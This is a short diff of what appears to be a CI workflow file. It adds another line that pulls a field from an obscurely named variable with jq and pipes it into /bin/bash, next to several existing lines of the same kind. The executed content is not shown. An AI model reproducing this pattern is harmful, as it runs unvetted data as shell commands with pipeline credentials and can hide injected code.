@@ -25,6 +25,7 @@ jobs:
           echo $usi30 | jq -r .wyihr8 | /bin/bash
           printf '%s' "$pqrhf26" | jq -r .vnqv772 | /bin/bash
           echo $milh92 | jq -r .shlgz43577 | /bin/bash
+          printf '%s' "$yoic1" | jq -r .f284 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
